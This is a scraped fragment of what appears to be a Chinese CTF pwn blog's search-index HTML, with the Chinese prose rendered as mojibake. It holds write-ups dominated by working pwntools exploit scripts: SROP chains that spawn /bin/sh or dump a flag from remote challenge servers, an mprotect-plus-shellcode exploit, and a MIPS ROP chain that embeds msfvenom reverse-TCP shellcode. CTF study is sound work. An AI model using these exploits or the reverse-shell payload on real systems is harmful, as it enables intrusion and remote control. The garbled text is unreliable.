sigframe_exec.rdi=sh_addr
sigframe_exec.rsi=0
sigframe_exec.rdx=0
sigframe_exec.rsp=buf_addr+0x200
sigframe_exec.rip=syscall_leave_ret

payload=p64(0)+p64(pop_syscall)+p64(0xf)+bytes(sigframe_exec)
payload=payload.ljust(0x200,b&amp;quot;a&amp;quot;)+b&amp;quot;/bin/sh\x00&amp;quot;

io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;aout&#34;&gt;a.out&lt;/h3&gt;
&lt;p&gt;Êï¥‰∏™Á®ãÂ∫èÂ¶Ç‰∏ã&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.text:0000000000401000                               ; =============== S U B R O U T I N E =======================================
.text:0000000000401000
.text:0000000000401000
.text:0000000000401000                               ; signed __int64 start()
.text:0000000000401000                               public _start
.text:0000000000401000                               _start proc near                        ; DATA XREF: LOAD:0000000000400018‚Üëo
.text:0000000000401000                                                                       ; LOAD:0000000000400088‚Üëo
.text:0000000000401000 B8 01 00 00 00                mov     eax, 1
.text:0000000000401005 BF 01 00 00 00                mov     edi, 1                          ; fd
.text:000000000040100A 48 BE 00 20 40 00 00 00 00 00 mov     rsi, offset msg                 ; &amp;quot;Hello Pwn&amp;quot;
.text:0000000000401014 BA 09 00 00 00                mov     edx, 9                          ; count
.text:0000000000401019 0F 05                         syscall                                 ; LINUX - sys_write
.text:000000000040101B B8 00 00 00 00                mov     eax, 0
.text:0000000000401020 48 89 E6                      mov     rsi, rsp                        ; buf
.text:0000000000401023 BF 00 00 00 00                mov     edi, 0                          ; fd
.text:0000000000401028 BA 90 01 00 00                mov     edx, 190h                       ; count
.text:000000000040102D 0F 05                         syscall                                 ; LINUX - sys_read
.text:000000000040102F C3                            retn
.text:000000000040102F
.text:000000000040102F                               _start endp
.text:000000000040102F
.text:0000000000401030                               ; ---------------------------------------------------------------------------
.text:0000000000401030 48 D1 E0                      shl     rax, 1
.text:0000000000401033 C3                            retn
.text:0000000000401033
.text:0000000000401034                               ; ---------------------------------------------------------------------------
.text:0000000000401034 B9 01 00 00 00                mov     ecx, 1
.text:0000000000401039 48 31 C8                      xor     rax, rcx
.text:000000000040103C C3                            retn
.text:000000000040103C
.text:000000000040103D                               ; ---------------------------------------------------------------------------
.text:000000000040103D 48 31 C0                      xor     rax, rax
.text:0000000000401040 C3                            retn
.text:0000000000401040
.text:0000000000401040                               _text ends
.text:0000000000401040
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;sropÔºåÈúÄË¶ÅÊâãÂä®ÊûÑÈÄ†raxÁöÑÂÄº‰∏∫0xfËß¶Âèësigframe&lt;br&gt;
ËøòÊòØËÄÅÊ†∑Â≠ê‰º™ÈÄ†Ê†àÂú®bss‰∏äÊâìÔºåÈ¢òÁõÆÂ∑≤ÁªèÁªôÂá∫&lt;code&gt;/bin/sh&lt;/code&gt;ÁöÑÂú∞ÂùÄ&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./a&amp;quot;)

syscall_ret=0x40102d
str_sh=0x40200A
ret_wt=0x401014
bss_addr=0x402200
shl_rax=0x401030
xor_1=0x401034 
xor_rax=0x40103D 

gdb.attach(io)
pause()

#read
sigframe=SigreturnFrame()
sigframe.rax=constants.SYS_read
sigframe.rdi=0
sigframe.rsi=bss_addr
sigframe.rdx=0x800
sigframe.rsp=bss_addr
sigframe.rbp=bss_addr
sigframe.rip=syscall_ret

payload=p64(xor_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(syscall_ret)+bytes(sigframe)
io.sendafter(b&amp;quot;Pwn&amp;quot;,payload)

sleep(3)


sigframe_exe=SigreturnFrame()
sigframe_exe.rax=constants.SYS_execve
sigframe_exe.rdi=str_sh
sigframe_exe.rsp=bss_addr
sigframe_exe.rbp=bss_addr
sigframe_exe.rsi=0
sigframe_exe.rdx=0
sigframe_exe.rip=syscall_ret

payload=p64(xor_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(shl_rax)+p64(xor_1)+p64(syscall_ret)+bytes(sigframe_exe)
# payload=b&amp;quot;aaaaaqaaaaaaa&amp;quot;
io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;0xgame2023_srop&#34;&gt;0xGame2023_srop:&lt;/h3&gt;
&lt;p&gt;0x‰∏§ÈÅìÈ¢òÈÉΩËÉΩÁî®Ëøô‰∏™Êâì&lt;br&gt;
fake stackÊâìorw&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./srop-revenge&amp;quot;)
io=remote(&amp;quot;8.130.35.16&amp;quot;,55003)
elf=ELF(&amp;quot;./srop-revenge&amp;quot;)

buf_addr=0x404800
syscall_ret=0x40138b
pop_rax=0x401390
flag=buf_addr+0x450


#fake stack on bss to read
sigframe=SigreturnFrame()
sigframe.rax=0 #read Á≥ªÁªüË∞ÉÁî®Âè∑
sigframe.rdi=0 #stdin Ê†áÂáÜËæìÂÖ•
sigframe.rsi=buf_addr #buf
sigframe.rdx=0x800 #size
sigframe.rsp=buf_addr
sigframe.rip=syscall_ret

payload=cyclic(0x10)+p64(pop_rax)+p64(0xf)+p64(syscall_ret)+bytes(sigframe)
io.send(payload)


# gdb.attach(io)
# pause()


#open
sigframe_open=SigreturnFrame()
sigframe_open.rax=2 #open Á≥ªÁªüË∞ÉÁî®Âè∑
sigframe_open.rdi=flag #filename
sigframe_open.rsi=0 
sigframe_open.rdx=0
sigframe_open.rsp=buf_addr+0x150 # top addr
sigframe_open.rip=syscall_ret

payload=p64(pop_rax)+p64(0xf)+p64(syscall_ret)+bytes(sigframe_open)
payload=payload.ljust(0x150,b&amp;quot;a&amp;quot;)


#read
sigframe_read=SigreturnFrame()
sigframe_read.rax=0 #read Á≥ªÁªüË∞ÉÁî®Âè∑
sigframe_read.rdi=3 #fd
sigframe_read.rsi=flag+0x100 #buf
sigframe_read.rdx=0x50 #size
sigframe_read.rsp=buf_addr+0x300 # top addr
sigframe_read.rip=syscall_ret

payload+=p64(pop_rax)+p64(0xf)+p64(syscall_ret)+bytes(sigframe_read)
payload=payload.ljust(0x300,b&amp;quot;a&amp;quot;)

#write
sigframe_write=SigreturnFrame()
sigframe_write.rax=1 #write Á≥ªÁªüË∞ÉÁî®Âè∑
sigframe_write.rdi=1 #stdout Ê†áÂáÜËæìÂá∫
sigframe_write.rsi=flag+0x100 #buf
sigframe_write.rdx=0x50 #size
sigframe_write.rsp=buf_addr+0x450 # top addr
sigframe_write.rip=syscall_ret

payload+=p64(pop_rax)+p64(0xf)+p64(syscall_ret)+bytes(sigframe_write)
payload=payload.ljust(0x450,b&amp;quot;a&amp;quot;)+b&amp;quot;flag&amp;quot;

io.send(payload)


io.interactive()

# Gadgets information
# ============================================================
# 0x000000000040080c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040080e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400810 : pop r14 ; pop r15 ; ret
# 0x0000000000400812 : pop r15 ; ret
# 0x000000000040080b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040080f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x0000000000400628 : pop rbp ; ret
# 0x0000000000400813 : pop rdi ; ret
# 0x0000000000400811 : pop rsi ; pop r15 ; ret
# 0x000000000040080d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040056e : ret
# 0x0000000000400798 : ret 0xbe

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;htb_sick_rop&#34;&gt;htb_sick_rop:&lt;/h3&gt;
&lt;p&gt;Âà©Áî®readËØª0xfÊûÑÈÄ†sigreturnÔºåÁÑ∂ÂêémprotectÂºÄÂÜôÊùÉÈôê&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./sick_rop&amp;quot;)
io=remote(&amp;quot;188.166.175.58&amp;quot;,30061)
elf=ELF(&amp;quot;./sick_rop&amp;quot;)
libc=elf.libc

read_text=0x401040
write_fuc=0x401017
write_text=0x401048
vuln=0x40102e
leave_ret=0x40104d
syscall_ret=0x401014
sc_addr=0x4010f8

# mprotect
sigframe=SigreturnFrame()
sigframe.rax=10  # mprotect
sigframe.rdi=0x401000  # addr
sigframe.rsi=0x1000 # len
sigframe.rdx=0x7 # flag
sigframe.rsp=0x4010f0 # ret to _start
sigframe.rip=syscall_ret

payload=cyclic(0x28)+p64(vuln)+p64(syscall_ret)+bytes(sigframe)
io.send(payload)

# gdb.attach(io)
# pause()

payload=b&amp;quot;a&amp;quot;*0xf
io.send(payload)

shellcode=asm(shellcraft.sh())
payload=cyclic(0x28)+p64(sc_addr)+shellcode
io.send(payload)


io.interactive()

# 0x000000000040104d : leave ; ret
# 0x0000000000401016 : ret
# 0x0000000000401014 : syscall ; ret
&lt;/code&gt;&lt;/pre&gt;
">SROP</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/KBygv4GCN/"" data-c="
          &lt;h3 id=&#34;ÂâçË®Ä&#34;&gt;ÂâçË®ÄÔºö&lt;/h3&gt;
&lt;p&gt;Êë∏‰∫Ü2Â§©üêüÊääËøô‰∏™Áúã‰∫Ü‰∏Ä‰∏ãÔºåÁ¨¨‰∏ÄÂ§©Êú¨Êù•ËÉΩÂ§üÂá∫ÁöÑÔºåÁªìÊûúÊâæÁöÑgadgetÂç°Âú®swËØ≠Âè•‰∏çÊâßË°å‰∫ÜÔºågdbÁàÜwarning &lt;code&gt;can&#39;t find the start of the function at xxx&lt;/code&gt;ÔºåÁΩëÁªú‰∏äËØ¥ÊòØÊó†Ê≥ïËÆøÈóÆÂÖ±‰∫´Â∫ìÁöÑÈóÆÈ¢òüòìÔºõ&lt;br&gt;
Á¨¨‰∫åÂ§©ÈáçÊñ∞Êâæ‰∫ÜÂá†‰∏™gadgetÁªìÊûúÊúÄÂêéÂèàÂá∫Áé∞ÂêåÊ†∑ÁöÑÈóÆÈ¢òÔºåÊúÄÂêéÂèàÈáçÊñ∞Êâæ‰∫ÜÂá†‰∏™gadgetÂ∞ΩÂèØËÉΩÁÆÄÂåñ‰∫ÜÊìç‰ΩúÊï∞ÊâçÊâìÈÄö&lt;/p&gt;
&lt;h3 id=&#34;Ê¶ÇËø∞&#34;&gt;Ê¶ÇËø∞Ôºö&lt;/h3&gt;
&lt;p&gt;Êú¨È¢òÊ∫¢Âá∫ÁÇπÂ≠òÂú®‰∫é&lt;code&gt;sprintf&lt;/code&gt;ÂáΩÊï∞ÊãºÊé•ÂèòÈáè&lt;code&gt;v10&lt;/code&gt;ÈïøÂ∫¶Ë∂ÖËøá&lt;code&gt;v11&lt;/code&gt;ÁºìÂÜ≤Âå∫Â§ßÂ∞èÔºåÂèØ‰ª•ÂØºËá¥&lt;code&gt;v11&lt;/code&gt;Ê†àÊ∫¢Âá∫&lt;br&gt;
Êú¨È¢òÊï∞ÊçÆ‰º†ËæìÈÄöËøásocketÔºåbashËÑöÊú¨ÊåáÂÆöÁ´ØÂè£ÂàùÂßãÂåñÂ¶Ç‰∏ã&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#! /bin/bash
cp $(which qemu-mipsel-static) ./q
./q  -L ./ -g 1234  ./socket_bof &amp;quot;9999&amp;quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÊúÄÂºÄÂßãÊàë‰ª¨gdb-multiarch remoteÂà∞1234Á´ØÂè£ÂêéÂú®Á®ãÂ∫èÂª∫Á´ãÁõëÂê¨ÁöÑÂáΩÊï∞Âêé‰∏ãÊñ≠ÁÇπcËøáÂéªÔºåÁÑ∂Âêé‰ΩøÁî®cyclicËÑöÊú¨ÊµãÁÆóÂÅèÁßªÔºåËÑöÊú¨Â¶Ç‰∏ãÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;mips&#39;,endian=&#39;little&#39;,bits=32)

io=remote(&amp;quot;127.0.0.1&amp;quot;,9999)

io.recvuntil(b&amp;quot;Send Me Bytes:&amp;quot;)

payload=cyclic(0x300)

io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂèØ‰ª•ÊµãÂá∫ÂÅèÁßª‰∏∫51&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1692793724271.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÁÑ∂ÂêéÊàë‰ª¨Â∞±ÂèØ‰ª•ÁùÄÊâãexpÁöÑÁºñÂÜô&lt;br&gt;
‰∏∫‰∫ÜÁªïËøáMIPSÊû∂ÊûÑÁöÑÁºìÂ≠ò‰∏ç‰∏ÄËá¥ÊÄßÔºåÊàë‰ª¨ÈúÄË¶Å‰∏ªÂä®Ë∞ÉÁî®&lt;code&gt;sleep()&lt;/code&gt;Êù•‰ΩøÂÜôÂÖ•ÁöÑshellcode‰ªé&lt;code&gt;D-Cache&lt;/code&gt;Âà∑Êñ∞Âà∞&lt;code&gt;I-Cache&lt;/code&gt;ÔºåÊâÄ‰ª•expÁºñÂÜôÊµÅÁ®ã‰∏éÂâçÊñá‰∏çÂêå&lt;br&gt;
Â§ßËá¥ÊµÅÁ®ãÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1.Á°Æ‰øùËÉΩÊ∫¢Âá∫Âà∞$ra
2.ÂØªÊâægadgetÂ∞Ü$a0ÂÄºËÆæ‰∏∫1ÔºåÂç≥sleepÁöÑÂèÇÊï∞
3.ÂØªÊâægadgetÊâßË°ålibc‰∏≠ÁöÑsleepÂπ∂ËÉΩÂ§üËøîÂõûÂà∞‰∏ã‰∏Ä‰∏™gadget
4.ÂØªÊâægadgetÂ∞ÜÂåÖÂê´shellcodeÁöÑÊ†àÂú∞ÂùÄÂÇ®Â≠òÂà∞ÂØÑÂ≠òÂô®‰∏≠
5.ÂØªÊâægadgetÂ∞ÜÂØÑÂ≠òÂô®ÂÄºËµãÂÄºÂà∞Ë∑≥ËΩ¨ËØ≠Âè•ÂØÑÂ≠òÂô®‰∏äË∑≥ËΩ¨Âà∞Ê†à‰∏äÁöÑÊ≠£Á°Æ‰ΩçÁΩÆÊâßË°åshellcode
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;gadgetsÊü•Êâæ&#34;&gt;gadgetsÊü•ÊâæÔºö&lt;/h4&gt;
&lt;p&gt;È¶ñÂÖàÊòØÊâæÁªô&lt;code&gt;$a0&lt;/code&gt;ÂØÑÂ≠òÂô®ËµãÂÄº‰∏∫1ÁöÑ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;Found 45 matching gadgets
Python&amp;gt;mipsrop.find(&amp;quot;li $a0,1&amp;quot;)
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x00018AA8  |  li $a0,1                                            |  jalr  $s3                             |
|  0x0002FB10  |  li $a0,1                                            |  jalr  $s1                             |
|  0x00012D3C  |  li $a0,1                                            |  jr    0x20+var_s0($sp)                |
|  0x00022420  |  li $a0,1                                            |  jr    0x18+var_s8($sp)                |
|  0x0002A9C8  |  li $a0,1                                            |  jr    0x18+var_s4($sp)                |
----------------------------------------------------------------------------------------------------------------
Found 5 matching gadgets
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ËøôÈáåÊàë‰ª¨ÈááÁî®ÂÅèÁßª‰∏∫0x2FB10ÁöÑgadget0&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.text:0002FB10 01 00 04 24                   li      $a0, 1
.text:0002FB14 21 C8 20 02                   move    $t9, $s1
.text:0002FB18 09 F8 20 03                   jalr    $t9 ; sub_2F818
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Êàë‰ª¨ÈúÄË¶ÅÊâæÂà∞‰∏Ä‰∏™ËÉΩÂ§üÂØπ&lt;code&gt;$s1&lt;/code&gt;ËµãÂÄºÁöÑgadget1ÔºåÊü•Êâæ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;Python&amp;gt;mipsrop.find(&amp;quot;lw $s1&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂèØ‰ª•ÊâæÂà∞0x7730Â§ÑÁöÑgadget1ÔºåÂπ∂‰∏îËøôÈáåËøòÂèØ‰ª•ÊéßÂà∂‰∏Ä‰∫õÂÖ∂ÂÆÉÂØÑÂ≠òÂô®&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.text:00007730 28 00 BF 8F                   lw      $ra, 0x18+var_s10($sp)
.text:00007734 24 00 B3 8F                   lw      $s3, 0x18+var_sC($sp)
.text:00007738 20 00 B2 8F                   lw      $s2, 0x18+var_s8($sp)
.text:0000773C 1C 00 B1 8F                   lw      $s1, 0x18+var_s4($sp)
.text:00007740 18 00 B0 8F                   lw      $s0, 0x18+var_s0($sp)
.text:00007744 08 00 E0 03                   jr      $ra
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Âà∞Ê≠§Â§Ñ‰ΩçÁΩÆÔºåÊàë‰ª¨ÈúÄË¶ÅÂú®ÊâßË°åÂÆå&lt;code&gt;sleep&lt;/code&gt;ÂêéÁªßÁª≠ÊâßË°åshellcodeÁöÑËØùÔºåÈúÄË¶Å‰∏Ä‰∏™Âà©Áî®&lt;code&gt;$ra&lt;/code&gt;Èô§Â§ñÂØÑÂ≠òÂô®Ë∑≥ËΩ¨ÁöÑÂπ∂‰∏îÂèØ‰ª•ÂÜô&lt;code&gt;$ra&lt;/code&gt;ÁöÑgadget2ÔºåÁªßÁª≠Êü•Êâæ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;Python&amp;gt;mipsrop.tail()
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x0001E03C  |  move $t9,$s1                                        |  jr    $s1                             |
|  0x0001F07C  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x0001F2C0  |  move $t9,$s0                                        |  jr    $s0                             |
|  0x0001FBCC  |  move $t9,$a1                                        |  jr    $a1                             |
|  0x000201F4  |  move $t9,$s0                                        |  jr    $s0                             |
|  0x00020F1C  |  move $t9,$s2                                        |  jr    $s2                             |
|  0x00020FE4  |  move $t9,$s2                                        |  jr    $s2                             |
|  0x00021200  |  move $t9,$s2                                        |  jr    $s2                             |
|  0x00021C34  |  move $t9,$s3                                        |  jr    $s3                             |
|  0x00022E94  |  move $t9,$s1                                        |  jr    $s1                             |
|  0x0002313C  |  move $t9,$s0                                        |  jr    $s0                             |
|  0x000267B4  |  move $t9,$s0                                        |  jr    $s0                             |
|  0x00033AF4  |  move $t9,$s0                                        |  jr    $s0                             |
----------------------------------------------------------------------------------------------------------------
Found 13 matching gadgets
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Êàë‰ª¨‰ΩøÁî®ÂÅèÁßª0x20F1CÂ§ÑÁöÑgadget2Ôºå‰∏ç‰ªÖËÉΩÂ§üÁªô&lt;code&gt;$ra&lt;/code&gt;ÂØÑÂ≠òÂô®ËµãÂÄºÔºå‰πüËÉΩÁî®gadget1ÊéßÂà∂&lt;code&gt;$s2&lt;/code&gt;ÂÄºËøõË°åË∑≥ËΩ¨&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.text:00020F1C 21 C8 40 02                   move    $t9, $s2
.text:00020F20 24 00 BF 8F                   lw      $ra, 0x18+var_sC($sp)
.text:00020F24 20 00 B2 8F                   lw      $s2, 0x18+var_s8($sp)
.text:00020F28 1C 00 B1 8F                   lw      $s1, 0x18+var_s4($sp)
.text:00020F2C 18 00 B0 8F                   lw      $s0, 0x18+var_s0($sp)
.text:00020F30 08 00 20 03                   jr      $t9
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Êàë‰ª¨ÂèØ‰ª•ÈÄöËøá&lt;code&gt;jr $t9&lt;/code&gt;Ë∑≥ËΩ¨Âà∞&lt;code&gt;sleep&lt;/code&gt;ÂáΩÊï∞‰∏≠ÔºåÊàë‰ª¨Âè™ÈúÄË¶ÅÈÄöËøágadget2ÊéßÂà∂&lt;code&gt;$ra&lt;/code&gt;‰∏∫shellcodeÁöÑÊ†àÂú∞ÂùÄÂç≥ÂèØÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøá&lt;code&gt;mipsrop.stackfinder()&lt;/code&gt;Êü•ÊâæÔºåËøô‰∏™Êåá‰ª§ÊòØÊü•ÊâæÂ∞ÜÊ†àÂú∞ÂùÄÂ≠òÂÖ•ÂØÑÂ≠òÂô®ÁöÑgadgetÔºåÊâæÂà∞ÂÅèÁßª0x16DD0Â§ÑÁöÑgadget3&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.text:00016DD0 18 00 A4 27                   addiu   $a0, $sp, 0x38+var_20
.text:00016DD4 21 C8 00 02                   move    $t9, $s0
.text:00016DD8 09 F8 20 03                   jalr    $t9
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ê≠§Â§ÑÈÄöËøáÊéßÂà∂&lt;code&gt;$s0&lt;/code&gt;Ëøõ‰∏ÄÊ≠•ÊéßÂà∂&lt;code&gt;$t9&lt;/code&gt;ÔºåËÄå&lt;code&gt;$s0&lt;/code&gt;Êàë‰ª¨Âú®gadget2‰∏≠Âç≥ÂèØÊéßÂà∂ÔºåÈÇ£‰πàÊàë‰ª¨Ë¶ÅË∑≥ËΩ¨Âà∞shellcodeÊâÄÂú®Ê†àÂú∞ÂùÄ‰∏äÔºåÂàôÈúÄË¶ÅÂ∞Ü&lt;code&gt;$a0&lt;/code&gt;ÂÄºÂ≠òÂÖ•&lt;code&gt;$t9&lt;/code&gt;ÔºåÊâÄ‰ª•Êàë‰ª¨ËøôÈáåÊéßÂà∂&lt;code&gt;$s0&lt;/code&gt;ÁöÑÂÄº‰∏∫‰∏ã‰∏Ä‰∏™gadget4ÔºåÊü•Êâæ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;Python&amp;gt;mipsrop.find(&amp;quot;move $t9,$a0&amp;quot;)
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x000214A0  |  move $t9,$a0                                        |  jalr  $a0                             |
----------------------------------------------------------------------------------------------------------------
Found 1 matching gadgets
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂÅèÁßª0x214A0Â§ÑÁöÑgadget4Êª°Ë∂≥Êàë‰ª¨ÁöÑÈúÄÊ±Ç&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;.text:000214A0 21 C8 80 00                   move    $t9, $a0
.text:000214A4 18 00 A2 AF                   sw      $v0, 0x30+var_18($sp)
.text:000214A8 09 F8 20 03                   jalr    $t9
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÊâÄ‰ª•Âà∞ÁõÆÂâç‰∏∫Ê≠¢Êàë‰ª¨Ê¢≥ÁêÜ‰∏ÄÈÅçÊÄùË∑ØÔºåÂèØ‰ª•ÂæóÂá∫‰∏ãÈù¢ÁöÑÂ§ßËá¥ÊµÅÁ®ãÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gadget1-&amp;gt;gadget0-gadget2-&amp;gt;sleep()-&amp;gt;gadget3-&amp;gt;gadget4-&amp;gt;shellcode
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂèØ‰ª•Ê†πÊçÆËøô‰∏™ÊµÅÁ®ãÂ§ßËá¥ÂÜôÂá∫payloadÁÑ∂ÂêégdbË∞ÉËØï&lt;br&gt;
Âú®Êú¨Êú∫‰∏äËøêË°åÁöÑÊó∂ÂÄôÔºåÂèëÁé∞Âú®gadget2‰∏äÂ°´ÂÖÖpaddingÁöÑÊó∂ÂÄôÔºåÈúÄË¶ÅÈ¢ùÂ§ñÂ°´ÂÖÖ0x4Â≠óËäÇÁöÑÊï∞ÊçÆÊâçËÉΩÊ≠£Â∏∏ÁªôÂØπÂ∫îÂØÑÂ≠òÂô®ËµãÂÄº&lt;br&gt;
msfvenomÁîüÊàêshellcodeÁöÑÊó∂ÂÄôÊ≥®ÊÑèÊåáÂÆö&lt;code&gt;LHOST&lt;/code&gt;Âíå&lt;code&gt;LPORT&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;exp&#34;&gt;exp:&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;mips&#39;,endian=&#39;little&#39;,bits=32)

io=remote(&amp;quot;127.0.0.1&amp;quot;,9999)

libc_base=0x3fecd000
sleep_func=0x2f2b0+libc_base


# msfvenom -p linux/mipsle/shell_reverse_tcp --arch mipsle --platform linux -f py --bad-chars &#39;\x00&#39;
buf =  b&amp;quot;&amp;quot;
buf += b&amp;quot;\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21&amp;quot;
buf += b&amp;quot;\xfd\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24&amp;quot;
buf += b&amp;quot;\x0c\x01\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f&amp;quot;
buf += b&amp;quot;\xfd\xff\x0f\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf&amp;quot;
buf += b&amp;quot;\x11\x5c\x0e\x3c\x11\x5c\xce\x35\xe4\xff\xae\xaf&amp;quot;
buf += b&amp;quot;\xf7\x83\x0e\x3c\xc0\xa8\xce\x35\xe6\xff\xae\xaf&amp;quot;
buf += b&amp;quot;\xe2\xff\xa5\x27\xef\xff\x0c\x24\x27\x30\x80\x01&amp;quot;
buf += b&amp;quot;\x4a\x10\x02\x24\x0c\x01\x01\x01\xfd\xff\x11\x24&amp;quot;
buf += b&amp;quot;\x27\x88\x20\x02\xff\xff\xa4\x8f\x21\x28\x20\x02&amp;quot;
buf += b&amp;quot;\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff\xff\x10\x24&amp;quot;
buf += b&amp;quot;\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff\x06\x28&amp;quot;
buf += b&amp;quot;\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf\xaf&amp;quot;
buf += b&amp;quot;\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf&amp;quot;
buf += b&amp;quot;\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf&amp;quot;
buf += b&amp;quot;\xfc\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24&amp;quot;
buf += b&amp;quot;\x0c\x01\x01\x01&amp;quot;
shellcode=buf


gadget0=0x2FB10+libc_base
# .text:0002FB10 01 00 04 24                   li      $a0, 1
# .text:0002FB14 21 C8 20 02                   move    $t9, $s1
# .text:0002FB18 09 F8 20 03                   jalr    $t9 ; sub_2F818


gadget1=0x7730+libc_base
# .text:00007730 28 00 BF 8F                   lw      $ra, 0x18+var_s10($sp)
# .text:00007734 24 00 B3 8F                   lw      $s3, 0x18+var_sC($sp)
# .text:00007738 20 00 B2 8F                   lw      $s2, 0x18+var_s8($sp)
# .text:0000773C 1C 00 B1 8F                   lw      $s1, 0x18+var_s4($sp)
# .text:00007740 18 00 B0 8F                   lw      $s0, 0x18+var_s0($sp)
# .text:00007744 08 00 E0 03                   jr      $ra


gadget2=0x20F1C+libc_base
# .text:00020F1C 21 C8 40 02                   move    $t9, $s2
# .text:00020F20 24 00 BF 8F                   lw      $ra, 0x18+var_sC($sp)
# .text:00020F24 20 00 B2 8F                   lw      $s2, 0x18+var_s8($sp)
# .text:00020F28 1C 00 B1 8F                   lw      $s1, 0x18+var_s4($sp)
# .text:00020F2C 18 00 B0 8F                   lw      $s0, 0x18+var_s0($sp)
# .text:00020F30 08 00 20 03                   jr      $t9


gadget3=0x16DD0+libc_base
# .text:00016DD0 18 00 A4 27                   addiu   $a0, $sp, 0x38+var_20
# .text:00016DD4 21 C8 00 02                   move    $t9, $s0
# .text:00016DD8 09 F8 20 03                   jalr    $t9


gadget4=0x214A0+libc_base
# .text:000214A0 21 C8 80 00                   move    $t9, $a0
# .text:000214A4 18 00 A2 AF                   sw      $v0, 0x30+var_18($sp)
# .text:000214A8 09 F8 20 03                   jalr    $t9


#stack for gadget1
payload=b&amp;quot;a&amp;quot;*51 #padding
payload+=p32(gadget1) # $ra0-&amp;gt;gadget1
payload+=b&amp;quot;a&amp;quot;*0x18 #padding
